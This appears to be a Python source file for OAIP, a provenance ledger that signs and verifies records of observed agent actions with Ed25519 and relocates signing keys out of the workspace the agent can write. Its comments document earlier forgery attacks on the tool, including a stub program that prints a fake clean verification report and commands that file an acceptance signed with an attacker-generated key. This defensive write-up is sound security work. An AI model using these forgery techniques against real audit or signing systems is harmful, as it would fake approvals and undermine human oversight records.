#!/usr/bin/env python3
"""OAIP prototype — Observed Action & Intent Protocol.

A minimal, RUNNABLE slice of the provenance stack we sketched:

  Observer  → capture a WORKSPACE SNAPSHOT (not HEAD) before/after an action
              via git plumbing, so history isn't polluted; compute per-file
              EFFECTS (before/after content hashes) from the two snapshots.
  Ledger    → a SQLite PROJECTION over content-addressed truth. Deletable and
              rebuildable; it stores hashes + typed relations, not canon.
  Bridge    → an accepted CLAIM becomes a real, signed Warrant record — the
              decision layer, with the provenance, the check blob and its
              transcript cited as evidence. Warrant is a normative dependency,
              not reimplemented here — and the validation is NOT filed as a
              Warrant `cmd@v1` check reason, because Warrant SPEC §3 defines
              that tag as execution in an isolated container and this
              implementation runs the check on the host (SPEC §7.3).

Deliberately NOT decided here (later layers): whether the action was correct,
whether the intent was met, which policy has authority, what reaction to run.

Principles it already honors:
  * before_state is a workspace snapshot (index+worktree+untracked+env/toolchain
    fingerprint), because `before_state = HEAD` lies.
  * execution success ≠ acceptance: a claim runs a SEPARATE validation check,
    and only that gates the warrant.
  * a shell command is one EFFECT/execution kind; the model is an envelope.
  * attribution here is exclusive-window (we wrap the command) → high confidence,
    recorded as parts-per-million integers (no floats).

Usage:
  oaip.py init
  oaip.py do --intent "..." --predicate p --check "<cmd>" --actor me@host -- <command...>
  # or step by step: intent / run / claim / accept
  oaip.py log
  oaip.py verify
  oaip.py conformance [vectors.json]

Stdlib only (+ the Warrant reference CLI for the bridge). Run inside a git repo.
"""
import argparse
import contextlib
import hashlib
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import time
import uuid
from pathlib import Path

OAIP = Path(".oaip")
DB = OAIP / "ledger.db"
ART = OAIP / "artifacts"        # content-addressed artifact blobs
WSTORE = OAIP / "warrants"      # the Warrant store (canonical decision layer)
# THE TRUST ROOT: the signing key and the keyring that says which key may sign
# as which actor. Everything else in `.oaip/` is content-addressed or signed and
# survives being written by a hostile hand; these two do not. They are held
# together so there is ONE directory whose custody has to be reasoned about —
# and, since 2026-07-30 (O4), that directory is NOT the observed workspace by
# default. `resolve_trust_root()` decides where it is; `main()` applies it before
# any subcommand runs. These module-level values are the pre-resolution defaults
# and are what an importer of this module sees until it calls `init_trust_root`.
TRUST_ROOT = OAIP
TRUST_ROOT_SOURCE = "not resolved"
WKEY = TRUST_ROOT / "dev.key"
PUBKEY = TRUST_ROOT / "dev.key.pub"  # the public half, recorded by `init` from keygen
TRUST = TRUST_ROOT / "trust.json"    # OAIP's keyring, in Warrant's trust-config shape
TRUST_ROOT_ENV = "OAIP_TRUST_ROOT"
# Warrant is a normative dependency (the decision layer). Point WARRANT_CLI at
# your `warrant.py` (or an installed `warrant`); defaults to a sibling checkout.
_wcli = os.environ.get("WARRANT_CLI")
if _wcli:
    WARRANT = _wcli.split()
else:
    _cand = Path.home() / "Projects/warrant/impl/warrant.py"
    WARRANT = [sys.executable, str(_cand)]
# A sleeping Warrant CLI hung `rebuild` forever: WARRANT_CLI names an arbitrary
# program, so every call to it is bounded (2026-07-30 review, F11).
def _warrant_timeout():
    """Seconds, from OAIP_WARRANT_TIMEOUT. A DIAGNOSIS, never a traceback.

    `OAIP_WARRANT_TIMEOUT=notanint` raised ValueError at import time, so every
    subcommand — `log`, `verify`, `init`, all of them — died with a traceback
    pointing at a line of this file rather than at the variable the operator set
    (C2-F2, 2026-07-30, third review round). An unusable setting is refused by
    name; it is not silently replaced with the default either, since an operator
    who set a bound meant to have one."""
    raw = (os.environ.get("OAIP_WARRANT_TIMEOUT") or "").strip()
    if not raw:
        return 120
    try:
        v = int(raw)
    except ValueError:
        sys.exit(f"OAIP_WARRANT_TIMEOUT={raw!r} is not an integer number of "
                 "seconds — unset it to use the default (120s), or give it a "
                 "positive whole number.")
    if v <= 0:
        sys.exit(f"OAIP_WARRANT_TIMEOUT={raw!r} must be a POSITIVE number of "
                 "seconds: a bound of zero or less would refuse every Warrant "
                 "call before it began.")
    return v


WARRANT_TIMEOUT = _warrant_timeout()
VERIFY_REPORT = "warrant.verify-report@v0"
# The explicit claim→warrant link, carried in the signed `subject.note`. Matched
# CASE-INSENSITIVELY: `note.startswith("oaip-claim:")` let any writer choose the
# weaker code path by spelling it `OAIP-CLAIM:` (2026-07-30, second review round).
NOTE_PREFIX = "oaip-claim:"
STOREMETA = OAIP / "store.json"     # store-format version, written once by `init`
STORE_FORMAT = "oaip-store@v1"
LOCK = OAIP / "lock"                # serialises projection-mutating commands
UNTRUSTED = OAIP / "projection.untrusted"   # set when a rebuild REFUSED to run
try:
    import fcntl
except ImportError:                 # non-POSIX: no advisory locking available
    fcntl = None


# ---------- content-addressed helpers ----------
def sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


HEX64 = re.compile(r"^[0-9a-f]{64}$")


# ---------- Ed25519 VERIFICATION, done by OAIP itself (RFC 8032) ----------
# WHY THIS IS HERE AND NOT DELEGATED (2026-07-30, THIRD adversarial round, C2-F1a)
# --------------------------------------------------------------------------
# Until this function existed, cryptographic signature validity was decided in
# exactly ONE place: a subprocess named by `$WARRANT_CLI`, or — with no env var
# set at all — an unpinned sibling checkout at `$HOME/Projects/warrant/impl/
# warrant.py`. The gate on that subprocess checked the SHAPE of the JSON it
# printed, not the identity of the program, and OAIP's own binding rule only
# asked which key was NAMED, never whether that key had signed anything. So this
# four-line program was a complete forgery kit:
#
#     # fakewarrant.py
#     import json
#     print(json.dumps({"report": "warrant.verify-report@v0",
#                       "grade": "settlement", "ok": True, "records": 2,
#                       "errors": 0, "warnings": 0, "findings": []}))
#
# With an accept record whose `sigs[0]` NAMES this ledger's real public key and
# carries `"sig": "abab…"` (garbage — no secret needed), the real Warrant CLI
# refused (rc=1), and `WARRANT_CLI="python3 fakewarrant.py" oaip rebuild` exited
# 0, derived the acceptance edge, and `oaip log` printed "(signed decision)".
# Reproduced again with NO environment variable, by planting the same stub at
# the unpinned default path.
#
# Pinning the CLI by content hash, or challenging it with a known-bad record,
# would have narrowed that; it would not have removed it. A verifier that is a
# separate program is a verifier someone else can supply. Ed25519 VERIFICATION
# needs no secret and no dependency — it is ~60 lines of integer arithmetic over
# stdlib `hashlib` — so OAIP does it here, in process, before deriving any edge.
# OAIP stays stdlib-only (SPEC/`README`), and Warrant remains the normative
# decision layer: it is still consulted, and it can still make OAIP refuse. It
# can no longer make OAIP believe.
#
# Pinned against the RFC 8032 §7.1 test vectors and against real
# `cryptography`-produced signatures in tests/signature_gate.py.
_ED_P = (1 << 255) - 19
_ED_L = (1 << 252) + 27742317777372353535851937790883648493
_ED_D = -121665 * pow(121666, _ED_P - 2, _ED_P) % _ED_P
_ED_SQRT_M1 = pow(2, (_ED_P - 1) // 4, _ED_P)
# SPEC §5 of Warrant: small-order and non-canonically-encoded public keys are
# rejected, because such a key lets an ALL-ZERO signature verify for a large
# fraction of messages — an attacker mints a "valid signature" attributing a
# decision to any actor id without knowing a secret. Copied from Warrant's own
# list so the two implementations refuse the same keys.
_ED_SMALL_ORDER = {bytes.fromhex(h) for h in (
    "0100000000000000000000000000000000000000000000000000000000000000",
    "c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac037a",
    "0000000000000000000000000000000000000000000000000000000000000080",
    "26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc05",
    "ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f",
    "26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85",
    "0000000000000000000000000000000000000000000000000000000000000000",
    "c7176a703d4dd84fba3c0b760d10670f2a2053fa2c39ccc64ec7fd7792ac03fa",
    "0100000000000000000000000000000000000000000000000000000000000080",
    "ecffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
)}


def weak_ed25519_pubkey(raw: bytes) -> bool:
    """True for a key a conforming verifier MUST reject (Warrant SPEC §5)."""
    if len(raw) != 32 or raw in _ED_SMALL_ORDER:
        return True
    y = int.from_bytes(raw, "little") & ((1 << 255) - 1)    # drop the sign bit
    return y >= _ED_P                                        # non-canonical y


def _ed_recover_x(y, sign):
    if y >= _ED_P:
        return None                     # non-canonical encoding
    xx = (y * y - 1) * pow(_ED_D * y * y + 1, _ED_P - 2, _ED_P) % _ED_P
    x = pow(xx, (_ED_P + 3) // 8, _ED_P)
    if (x * x - xx) % _ED_P != 0:
        x = x * _ED_SQRT_M1 % _ED_P
    if (x * x - xx) % _ED_P != 0:
        return None                     # not on the curve
    if x == 0 and sign:
        return None                     # non-canonical encoding of x = 0
    return _ED_P - x if x & 1 != sign else x


def _ed_decompress(b):
    """A 32-byte little-endian point encoding → extended coordinates, or None."""
    if len(b) != 32:
        return None
    y = int.from_bytes(b, "little")
    sign, y = y >> 255, y & ((1 << 255) - 1)
    x = _ed_recover_x(y, sign)
    return None if x is None else (x, y, 1, x * y % _ED_P)


def _ed_add(P, Q):
    A = (P[1] - P[0]) * (Q[1] - Q[0]) % _ED_P
    B = (P[1] + P[0]) * (Q[1] + Q[0]) % _ED_P
    C = 2 * P[3] * Q[3] * _ED_D % _ED_P
    D = 2 * P[2] * Q[2] % _ED_P
    E, F, G, H = B - A, D - C, D + C, B + A
    return (E * F % _ED_P, G * H % _ED_P, F * G % _ED_P, E * H % _ED_P)


def _ed_mul(s, P):
    Q = (0, 1, 1, 0)
    while s > 0:
        if s & 1:
            Q = _ed_add(Q, P)
        P = _ed_add(P, P)
        s >>= 1
    return Q


_ED_GY = 4 * pow(5, _ED_P - 2, _ED_P) % _ED_P
_ED_G = (_ed_recover_x(_ED_GY, 0), _ED_GY, 1,
         _ed_recover_x(_ED_GY, 0) * _ED_GY % _ED_P)


def ed25519_verify(pub: bytes, msg: bytes, sig: bytes) -> bool:
    """RFC 8032 Ed25519 verification. Verify-only: no secret ever touches this.

    Strict in the directions that matter for a decision layer: a small-order or
    non-canonical public key is refused, `S` must be reduced (no malleability),
    and `R` must be a canonical point encoding. Refusing more than Warrant does
    can only cost OAIP an edge it would otherwise derive; accepting more could
    cost the protocol its central fact."""
    if len(pub) != 32 or len(sig) != 64 or weak_ed25519_pubkey(pub):
        return False
    A = _ed_decompress(pub)
    R = _ed_decompress(sig[:32])
    if A is None or R is None:
        return False
    S = int.from_bytes(sig[32:], "little")
    if S >= _ED_L:
        return False
    k = int.from_bytes(hashlib.sha512(sig[:32] + pub + msg).digest(),
                       "little") % _ED_L
    lhs, rhs = _ed_mul(S, _ED_G), _ed_add(R, _ed_mul(k, A))
    return ((lhs[0] * rhs[2] - rhs[0] * lhs[2]) % _ED_P == 0
            and (lhs[1] * rhs[2] - rhs[1] * lhs[2]) % _ED_P == 0)


# ---------- THE SIGNED MESSAGE (Warrant SPEC v0.4 §5, package 0.6.0) ----------
# WHAT MOVED, AND WHY OAIP HAS A COPY OF IT AT ALL
# -----------------------------------------------
# OAIP verifies Ed25519 in process (see `ed25519_verify` above) precisely so that
# no program named by `$WARRANT_CLI` decides what a valid signature is. The price
# of that independence is that OAIP holds its own copy of the CONSTRUCTION — the
# exact bytes a Warrant key covers — and two copies of one rule is a rule that
# can drift. It drifted on 2026-07-31: Warrant SPEC v0.4 replaced the message.
#
#     before (v0.3, warrant <= 0.5.x):  msg = WarrantID_raw                32 bytes
#     now    (v0.4, warrant >= 0.6.0):  msg = b"warrant-sig-v1:" || WarrantID_raw
#                                                                 15 + 32 = 47 bytes
#
# Still pure RFC 8032 Ed25519 over a byte string — no Ed25519ctx, no dom2 prefix,
# nothing a from-scratch verifier has to grow. Only the message changed.
#
# WHY UPSTREAM CHANGED IT. A bare 32-byte WarrantID is byte-indistinguishable
# from any other bare SHA-256 digest, so a key that also signs digests in a
# neighbouring protocol — in-toto/DSSE payload digests (which `tools/intoto.py`
# puts one hop away from this ledger), TUF metadata, Σ-GLYPH NodeHashes, RFC 6962
# roots, git object ids — produces bytes that are syntactically a valid signature
# in both, in both directions. The 15 ASCII bytes name this protocol inside the
# message the key covers.
#
# THE TWO CONSTRUCTIONS ARE DISJOINT, DELIBERATELY. Exactly one of them verifies
# for a given (key, sig, WarrantID), never both, and there is NO dual-accept
# window at any time under any flag (Warrant DEC-001 §4.3). A verifier that
# accepted both would have no domain separation at all — an attacker would simply
# present the legacy one — so OAIP does not have a compatibility mode here, and
# `legacy_signature` below exists only to say a better sentence about a refusal
# that has already happened. See SPEC §8.6 for why this is NOT the same thing as
# §6.4 legacy-read mode, and must never be routed through it.
SIG_DOMAIN = b"warrant-sig-v1:"


def sig_message(wid: str) -> bytes:
    """The exact 47 bytes an Ed25519 Warrant signature covers (Warrant SPEC §5).

    Callers must have already established that `wid` is 64 lowercase hex; every
    one of them reaches this through `signature_verifies`, which is total."""
    return SIG_DOMAIN + bytes.fromhex(wid)


def _sig_entry_bytes(wid, s):
    """(pub, sig) as raw bytes for a well-formed entry, or None.

    Shared by the two predicates below so that "is this entry even shaped like a
    signature?" is answered in ONE place: when the accepting predicate and the
    diagnosing one disagree about what they will look at, the diagnosis starts
    describing records the gate never considered."""
    if not isinstance(s, dict):
        return None
    key, sig = s.get("key"), s.get("sig")
    # `isinstance(wid, str)` because this function is total about EVERY other
    # input and was not about this one: `HEX64.match(None)` raised TypeError
    # (F4). No caller passes None today; a predicate that answers "does this
    # verify?" with an exception for one input shape is a trap for the one that
    # will (2026-07-30, fourth round).
    if not (isinstance(key, str) and isinstance(sig, str)
            and isinstance(wid, str) and HEX64.match(wid)):
        return None
    try:
        return bytes.fromhex(key), bytes.fromhex(sig)
    except ValueError:
        return None


def signature_verifies(wid: str, s) -> bool:
    """Does signature entry `s` verify over WarrantID `wid`, per OAIP itself?

    The message is the domain-separated one above, NOT the bare WarrantID; the
    WarrantID inside it is sha256 over the canonical body, which
    `read_warrant_store` has already recomputed from the file. So this check is
    anchored in bytes OAIP hashed itself, not in anything a store, an env var or
    a subprocess said.

    This is the ONLY predicate in this file an acceptance edge is derived from.
    `legacy_signature` is never consulted before it and never overrides it."""
    parts = _sig_entry_bytes(wid, s)
    if parts is None:
        return False
    pub, raw = parts
    return ed25519_verify(pub, sig_message(wid), raw)


# The §6 report string Warrant SPEC §5 makes NORMATIVE for a verifier that
# recognises a pre-v1 signature: "A verifier that recognises a signature valid
# over the bare WarrantID MUST report it with these exact bytes". OAIP verifies
# Warrant records, so OAIP is such a verifier and emits the same bytes — a
# consumer can then branch on the diagnosis rather than on whose rendering it is.
# Pure ASCII on purpose: several implementations, several JSON encoders, one
# string. `SPEC 5` and the straight quotes are upstream's, not a typo here.
LEGACY_SIG_MESSAGE = (
    "signature does not verify (excluded): LEGACY pre-v1 signature construction "
    "(signed the bare 32-byte WarrantID; SPEC 5 requires \"warrant-sig-v1:\" || "
    "WarrantID). Re-sign with: warrant resign --key <keyfile>")


def legacy_signature(wid: str, s) -> bool:
    """True if `s` is a valid signature over the BARE 32-byte WarrantID — the
    pre-0.6.0 construction Warrant SPEC v0.4 §5 replaced.

    DIAGNOSIS ONLY, AND THAT IS A LOAD-BEARING SENTENCE. Nothing in this file
    treats a true return as acceptance: no caller of this function derives an
    edge, writes a keyring binding, or changes an exit status from non-zero to
    zero. It is called only where OAIP has ALREADY refused, to replace the
    sentence "the signature does NOT verify against key ab12cd34…" — which a
    corrupted byte, a truncated file, a wrong key and a stale Warrant all produce
    identically — with one that names the cause and the remedy.

    A store signed before the flag day is exactly the case this is for. It is
    also exactly the case that must NOT quietly work: see SPEC §8.6."""
    parts = _sig_entry_bytes(wid, s)
    if parts is None:
        return False
    pub, raw = parts
    return ed25519_verify(pub, bytes.fromhex(wid), raw)


def warrant_cli_available() -> bool:
    """True when the WARRANT argv names something that can actually run.
    Mirrors tools/check.py: either the program is on PATH / at its path, and —
    for the `python3 …/warrant.py` form — the script file exists.

    NOT an identity check: `WARRANT_CLI=/usr/bin/true` satisfies this, and so
    does any stub that prints a clean report (see `store_report`). Nothing here
    or in `store_report` establishes WHICH program ran; what makes that
    survivable is that OAIP verifies signatures itself (`ed25519_verify`)."""
    prog = WARRANT[0]
    if not (shutil.which(prog) or Path(prog).exists()):
        return False
    if len(WARRANT) >= 2 and WARRANT[1].endswith(".py"):
        return Path(WARRANT[1]).is_file()
    return True


def wrun(*args):
    """The Warrant CLI, bounded in time.

    Every call is `timeout=`-bounded because WARRANT_CLI names an ARBITRARY
    program: a CLI that sleeps forever hung `oaip rebuild` forever, with no
    output and no way to tell it from slow work (2026-07-30 review, F11). A
    timeout is reported as a distinct, non-zero result — never as success."""
    try:
        return subprocess.run(WARRANT + list(args), capture_output=True,
                              text=True, timeout=WARRANT_TIMEOUT)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(
            WARRANT + list(args), 124, "",
            f"the Warrant CLI did not exit within {WARRANT_TIMEOUT}s "
            "(OAIP_WARRANT_TIMEOUT)")
    except OSError as e:
        return subprocess.CompletedProcess(WARRANT + list(args), 127, "",
                                           f"cannot run the Warrant CLI: {e}")


# ---------- OAIP's keyring (key↔actor binding) ----------
# WHY OAIP OWNS THIS, AND WHY IT IS NOT WARRANT'S JOB
# --------------------------------------------------
# Warrant SPEC §5: "Key↔actor binding is out of scope for v0.1 (use your existing
# PKI/keyring); implementations MUST verify signatures against the stated key and
# report the binding as unverified if no keyring is configured." §5.1 adds:
# "Bound/unbound is a report unless a v0.3 policy explicitly makes bound
# signatures required", and "No interchangeable keyring file format is mandated."
#
# So `warrant verify` CANNOT be configured to fail on an unbound signature, and
# it exits 0 for a store whose only record is signed by a freshly generated key
# claiming any actor id it likes. Measured on this branch before this change:
#   warrant keygen --out attacker.key
#   warrant --store .oaip/warrants accept … --note oaip-claim:<cid> \
#           --actor tester@local --key attacker.key
#   -> warrant verify: 0 errors, 1 warning ("binding unverified (no keyring)")
#   -> oaip rebuild:  warrant=1
#   -> oaip log:      WARRANT 41d32da62a81…  (signed decision)
# for a claim NOBODY accepted. The protocol's central fact, forged for free.
#
# Warrant's own settlement grade (`verify --settlement --trust-config`) DOES
# compute bound/unbound against a pinned keyring, and OAIP corroborates with it
# (see `unbound_by_warrant`) — but two properties make it insufficient alone:
# it is a WARN by specification, and its machine-readable
# `warrant.verify-report@v0` omits the finding entirely in quiet mode (the
# emitting branch is `if quiet: pass`), so the JSON an integrator is told to
# consume reports 0 errors and no binding finding for an unbound signer.
# Therefore the ENFORCED rule is OAIP's own, over OAIP's own keyring.
def note_convention_since():
    """The ts from which a missing `oaip-claim:` note is a DEFECT, not history.

    Returns (cutoff, error). `cutoff` is an int, or None when this store predates
    the store-format marker ENTIRELY — file absent — in which case any of its
    records may genuinely be legacy. A marker that is PRESENT but unreadable is
    an error, never a None.

    WHY A STORE-FORMAT VERSION AND NOT A PROPERTY OF THE RECORD (F8, 2026-07-30,
    second review round). Rebuild routed accepts without the note to a
    subject-hash fallback and called those records "legacy" — but "has no note"
    is a property the WRITER chooses. Omitting the note (or spelling the prefix
    `OAIP-CLAIM:`) selected the weaker path on demand, in a brand-new store,
    fanning one warrant onto every claim with a colliding subject. Reproduced
    here: two direct filings, one with no note and one with a case-variant
    prefix, both took the fallback and both produced an edge, `oaip verify`
    reporting 0 errors.

    So the criterion is one the writer cannot choose: `init` stamps
    `.oaip/store.json` with the moment this store began requiring the note. A
    record filed after that had every opportunity to carry the link, so a missing
    link is a defect in the filer, and no edge is derived — not even with
    --allow-legacy-links. Only a store with NO marker (created before OAIP
    stamped one) can contain genuinely legacy records, and even there the
    fallback stays off until the operator asks for it in as many words.

    AND IT FAILED OPEN (C3-F1, 2026-07-30, THIRD review round). Every unreadable
    marker — truncated file, wrong type, a directory at that path, a missing
    field — returned None, which every caller read as "this store predates the
    convention". So a single corrupt byte in `.oaip/store.json` turned a
    brand-new store into an eligible-for-guessing legacy store, and
    `--allow-legacy-links` then fired the subject-hash guess while printing the
    false sentence "Only records filed before this store had a format marker are
    eligible" — about a store that HAS one, sitting right there. A marker that is
    present but cannot be read is the one case where OAIP knows it does not know:
    it must refuse, not assume the weaker rule."""
    if not STOREMETA.exists():
        return None, None
    if not STOREMETA.is_file():
        return None, (f"{STOREMETA}: the store-format marker is not a regular "
                      "file — this store's format cannot be read, and OAIP will "
                      "not fall back to treating its records as legacy")
    try:
        meta = loads_ijson(STOREMETA.read_bytes())
    except (ValueError, OSError) as e:
        return None, (f"{STOREMETA}: the store-format marker is present but "
                      f"unreadable ({e}) — refusing to guess whether this "
                      "store's records predate the oaip-claim note convention")
    ts = meta.get("note_convention_since") if isinstance(meta, dict) else None
    if not (isinstance(ts, int) and not isinstance(ts, bool)):
        return None, (f"{STOREMETA}: the store-format marker carries no integer "
                      "`note_convention_since` — refusing to guess whether this "
                      "store's records predate the oaip-claim note convention "
                      "(restore or remove the marker deliberately)")
    return ts, None


def ensure_oaip_dir():
    """The ledger directory, or a refusal that says what is in the way.

    `OAIP.mkdir(exist_ok=True)` raised FileExistsError — a bare traceback — when
    a plain FILE sat at `.oaip` (C1-F2, 2026-07-30, third review round). The
    directory and symlink cases had been handled and the file case was missed,
    which is the same defect class the whole branch keeps finding: a refusal is a
    decision, a traceback is an accident. Note that on a case-insensitive
    filesystem a file named `.OAIP` is this path."""
    if OAIP.exists() and not OAIP.is_dir():
        kind = "a symlink to a non-directory" if OAIP.is_symlink() else "a file"
        sys.exit(f"refusing to use {OAIP}: it exists and is {kind}, not a "
                 "directory. This is where the ledger, the Warrant store and "
                 "this observer's SIGNING KEY live. Move or remove it (on a "
                 "case-insensitive filesystem, check for `.OAIP` too), then run "
                 "`oaip init`.")
    try:
        OAIP.mkdir(exist_ok=True)
    except OSError as e:
        sys.exit(f"cannot create the ledger directory {OAIP}: {e}")


def ensure_oaip_dir_readable():
    """The half of `ensure_oaip_dir` that never CREATES anything — for the read
    paths, which must diagnose a blocked ledger without conjuring an empty one."""
    if OAIP.exists() and not OAIP.is_dir():
        ensure_oaip_dir()               # refuses, naming what is in the way


# ---------- privilege separation: WHERE the trust root lives (O4, 2026-07-30)
# THE BOUNDARY THIS MOVES
# -----------------------
# Five adversarial rounds ended at one sentence in llms.txt: "anyone who can
# write `.oaip/` can write the keyring AND the signing key". That party is not
# hypothetical — it is the OBSERVED AGENT. `oaip run` executes the wrapped
# command with the workspace as its cwd, and `.oaip/dev.key` (the key every
# acceptance is signed with) and `.oaip/trust.json` (the file saying which key
# may sign as which actor) were both under it. Nothing in the five rounds was
# broken by that; each check was satisfied HONESTLY, with a key the agent held.
#
# So the fix is not another check. It is moving the two files the agent must not
# hold out of the directory the agent is given, and refusing to be pointed back
# at them by anything the agent can write.
#
# WHERE IT LOOKS, IN ORDER, AND WHY THAT ORDER
#   1. `--trust-root PATH`      — the operator, per invocation.
#   2. `$OAIP_TRUST_ROOT`       — the operator, per environment.
#   3. the DEFAULT location for this workspace, if it exists:
#      `$XDG_CONFIG_HOME/oaip/roots/<sha256 of the ledger's real path>`.
#      Load-bearing property: this path is COMPUTED from where the ledger is,
#      not read out of any file — so deleting or rewriting workspace state
#      cannot make OAIP forget about it (see `store_trust_pointer`).
#   4. the pointer `oaip init` recorded in `.oaip/store.json`, for a deployment
#      whose root is somewhere else. That file IS agent-writable, so it may only
#      ever cause a REFUSAL: if the default location also exists and disagrees,
#      OAIP refuses rather than choosing; if the pointer names a root that is not
#      there, OAIP refuses rather than falling back to the workspace.
#   5. the workspace itself — only for a ledger that predates all of this and
#      still has `.oaip/trust.json`. It keeps working, and says what it costs.
#
# WHAT THIS BUYS AND WHAT IT DOES NOT, stated here because the previous rounds
# repeatedly caught this file overstating: relocation separates the key from the
# WORKSPACE, not from the USER. A process running as the same uid can read
# `$XDG_CONFIG_HOME` as easily as `.oaip/`. It is decisive exactly where the
# agent's write access is confined to the workspace — a container mount, a CI
# checkout, a sandboxed tool with the repo as its writable root — and it is worth
# nothing against an unconfined process with the observer's own uid. That case
# needs a second uid or a separate signing process: SPEC §8.4 profiles C and D,
# documented and NOT implemented.
def xdg_config_home() -> Path:
    raw = (os.environ.get("XDG_CONFIG_HOME") or "").strip()
    if raw and os.path.isabs(raw):
        return Path(raw)
    return Path.home() / ".config"


def ledger_id() -> str:
    """A stable name for THIS ledger's location.

    The trust root is per-ledger, not per-user: the keyring says which key may
    sign as `tester@local` HERE, and sharing one file across workspaces would let
    a key bound in one repository decide acceptances in another. Derived from the
    ledger's real path so it can be recomputed with nothing but the cwd."""
    return sha256(os.path.realpath(OAIP).encode())[:16]


def default_trust_root() -> Path:
    return xdg_config_home() / "oaip" / "roots" / ledger_id()


def same_path(a, b) -> bool:
    return os.path.realpath(a) == os.path.realpath(b)


def in_workspace(p) -> bool:
    """Is `p` inside the directory the observed command runs in?"""
    here = os.path.realpath(".")
    real = os.path.realpath(p)
    return real == here or real.startswith(here + os.sep)


def store_trust_pointer():
    """(mode, path, error) — where `.oaip/store.json` SAYS the trust root is.

    A hint, never an authority. The file lives in the observed workspace, so the
    party this protocol gates can rewrite it; every caller therefore treats a
    disagreement as a reason to refuse and never as a redirection."""
    if not STOREMETA.is_file():
        return None, None, None
    try:
        meta = loads_ijson(STOREMETA.read_bytes())
    except (ValueError, OSError) as e:
        return None, None, f"{STOREMETA} is unreadable ({e})"
    tr = (meta or {}).get("trust_root") if isinstance(meta, dict) else None
    if tr is None:
        return None, None, None
    if not isinstance(tr, dict) or tr.get("mode") not in ("external", "workspace"):
        return None, None, (f"{STOREMETA} carries a `trust_root` field that is "
                            "not a trust-root record")
    if tr["mode"] == "workspace":
        return "workspace", OAIP, None
    p = tr.get("path")
    if not (isinstance(p, str) and p):
        return None, None, (f"{STOREMETA} says the trust root is external and "
                            "does not say where")
    return "external", Path(p), None


def resolve_trust_root(explicit=None):
    """(path, source) — see the ordered list above. Refuses; never guesses."""
    if explicit:
        return Path(explicit), "--trust-root"
    env = (os.environ.get(TRUST_ROOT_ENV) or "").strip()
    if env:
        return Path(env), f"${TRUST_ROOT_ENV}"
    default = default_trust_root()
    mode, ptr, err = store_trust_pointer()
    if err:
        sys.exit(f"refusing to guess where this ledger's trust root is: {err}. "
                 "The trust root holds the signing key and the keyring that "
                 "decides which key may accept anything here, so a pointer that "
                 "cannot be read is not a pointer to fall back from. Name it: "
                 "`oaip --trust-root <path> …`.")
    if default.is_dir():
        if ptr is not None and not same_path(ptr, default):
            sys.exit("two trust roots claim this ledger: "
                     f"{default.resolve()} exists, and "
                     f"{STOREMETA} points at {ptr}. OAIP will not choose between "
                     "them — the wrong choice is a keyring an attacker supplied. "
                     "Say which one is yours: `oaip --trust-root <path> …`.")
        return default, "the default location for this workspace"
    if mode == "external":
        if not Path(ptr).is_dir():
            sys.exit(f"this ledger's trust root is recorded as {ptr} and there "
                     "is no directory there. Refusing to fall back to a keyring "
                     "inside the observed workspace: that is the arrangement the "
                     "relocation exists to prevent, and a missing trust root is "
                     "as likely to mean 'someone moved it' as 'you moved it'. "
                     "Restore it, or name where it is now with `oaip "
                     "--trust-root <path> …`.")
        return Path(ptr), str(STOREMETA)
    if mode == "workspace" or TRUST.is_file() or WKEY.is_file():
        return OAIP, ("this workspace (a ledger from before the trust root "
                      "could be relocated)")
    return default, "the default location for this workspace"


def apply_trust_root(path):
    """Point the module's key/keyring paths at `path`."""
    global TRUST_ROOT, WKEY, PUBKEY, TRUST
    TRUST_ROOT = Path(path)
    WKEY = TRUST_ROOT / "dev.key"
    PUBKEY = TRUST_ROOT / "dev.key.pub"
    TRUST = TRUST_ROOT / "trust.json"


def init_trust_root(explicit=None):
    global TRUST_ROOT_SOURCE
    path, source = resolve_trust_root(explicit)
    apply_trust_root(path)
    TRUST_ROOT_SOURCE = source


_WARNED_WORKSPACE_TRUST = []


def warn_workspace_trust_root():
    """Say, once, when the keyring being consulted is one the observed agent can
    write. Legacy ledgers keep working; they do not keep quiet."""
    if trust_root_mode() != "workspace" or _WARNED_WORKSPACE_TRUST:
        return
    _WARNED_WORKSPACE_TRUST.append(True)
    print(f"warning: this ledger's trust root is {TRUST_ROOT}, INSIDE the "
          "workspace the observed command runs in — so whatever OAIP observes "
          "can also rewrite the keyring that decides whose acceptances count, "
          "and read the key they are signed with. Move it out with `oaip "
          "trust-root --migrate` (one command; existing acceptance edges "
          "survive).", file=sys.stderr)


def trust_root_mode():
    return "workspace" if in_workspace(TRUST_ROOT) else "external"


def ensure_trust_root_dir():
    """The trust root, created 0700 if it is not there.

    Keyed on whether the trust root IS the ledger directory, not on whether it
    lies inside the workspace: `--trust-root ./keys` is inside the workspace and
    still has to be created, and routing it to `ensure_oaip_dir` left `init`
    reporting ENOENT on a directory nothing had made."""
    if same_path(TRUST_ROOT, OAIP):
        ensure_oaip_dir()       # keeps the "a FILE at .oaip" diagnosis intact
        return
    try:
        existed = TRUST_ROOT.is_dir()
        TRUST_ROOT.mkdir(parents=True, exist_ok=True)
        # 0700 ONLY on creation. Re-asserting it on every run would undo an
        # operator's deliberate mode — `chmod 500` on a trust root is how a
        # single-uid deployment stops a wandering process from binding a new key,
        # and a tool that quietly widens permissions it did not set is doing the
        # opposite of what this whole change is for.
        if not existed and os.name == "posix":
            os.chmod(TRUST_ROOT, 0o700)
    except OSError as e:
        sys.exit(f"cannot create the trust root {TRUST_ROOT}: {e}. This is "
                 "where this ledger's signing key and keyring live; without it "
                 "OAIP can neither sign nor say whose signature counts.")


# ---------- custody: who else on this host can read the key or write the keyring
# THE GAP THIS CLOSES (O4, 2026-07-30). Five rounds of review hardened WHAT OAIP
# believes — the signature, the binding, the claim link — and nothing at all
# checked WHO ELSE CAN SUPPLY those inputs from the same filesystem. A signing
# key at mode 0644 is a key every account on the host can sign with, and a
# keyring at 0666 is a keyring every account can vouch with; OAIP would have used
# both without a word. The check is cheap, it is the baseline every ssh client
# has enforced for thirty years, and its absence was not written down anywhere.
#
# Deliberately narrow, and NOT a claim about privilege separation: mode bits say
